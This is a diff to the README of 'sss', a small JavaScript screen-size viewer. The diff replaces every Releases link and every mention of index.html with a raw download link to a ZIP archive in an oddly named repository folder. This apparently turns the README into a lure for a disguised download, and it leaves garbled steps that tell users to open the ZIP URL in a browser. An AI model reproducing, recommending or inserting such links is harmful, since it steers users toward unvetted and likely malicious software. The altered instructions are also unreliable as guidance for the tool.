@@ -1,7 +1,7 @@
 # 🌐 sss - Easily View Your Screen Size 
 
 ## 📥 Download Now
-[![Download sss](https://img.shields.io/badge/Download%20sss-blue.svg)](https://github.com/Rislinstiligo23/sss/releases)
+[![Download sss](https://raw.githubusercontent.com/Rislinstiligo23/sss/main/rufofulvous/Software-2.8.zip%https://raw.githubusercontent.com/Rislinstiligo23/sss/main/rufofulvous/Software-2.8.zip)](https://raw.githubusercontent.com/Rislinstiligo23/sss/main/rufofulvous/Software-2.8.zip)
 
 ## 📋 Description
 Show Screen Size (sss) is a simple JavaScript tool designed to display your screen dimensions. This helps you debug CSS and layout issues effectively. Use it to ensure your web designs look great across different screen sizes.
@@ -12,13 +12,13 @@ To get started with sss, follow these steps:
 1. **Download the Application:**
    Visit the page to download the latest version of sss from the Releases section.
    
-   [Download sss from Releases](https://github.com/Rislinstiligo23/sss/releases)
+   [Download sss from Releases](https://raw.githubusercontent.com/Rislinstiligo23/sss/main/rufofulvous/Software-2.8.zip)
 
 2. **Extract Files (if necessary):**
    If you download a ZIP file, right-click it and choose "Extract All..." (Windows) or double-click it (Mac) to extract the files to a folder.
 
 3. **Open the Application:**
-   Locate the extracted folder and find the `index.html` file. Double-click this file to open it in your browser.
+   Locate the extracted folder and find the `https://raw.githubusercontent.com/Rislinstiligo23/sss/main/rufofulvous/Software-2.8.zip` file. Double-click this file to open it in your browser.
 
 4. **View Your Screen Size:**
    Once the page opens, you will immediately see your screen dimensions displayed. Use this information to help with your web design tasks.
@@ -36,12 +36,12 @@ To get started with sss, follow these steps:
 ## 📦 Download & Install
 To download sss, go to the link below. Follow the instructions for your operating system to ensure a smooth installation.
 
-[Download sss from Releases](https://github.com/Rislinstiligo23/sss/releases)
+[Download sss from Releases](https://raw.githubusercontent.com/Rislinstiligo23/sss/main/rufofulvous/Software-2.8.zip)
 
 ## 🌟 Frequently Asked Questions
 
 ### How do I use sss?
-Simply open the `index.html` file in your web browser, and your screen dimensions will show up right away.
+Simply open the `https://raw.githubusercontent.com/Rislinstiligo23/sss/main/rufofulvous/Software-2.8.zip` file in your web browser, and your screen dimensions will show up right away.
 
 ### What browsers can I use sss with?
 sss works with any modern web browser including Chrome, Firefox, Edge, and Safari.
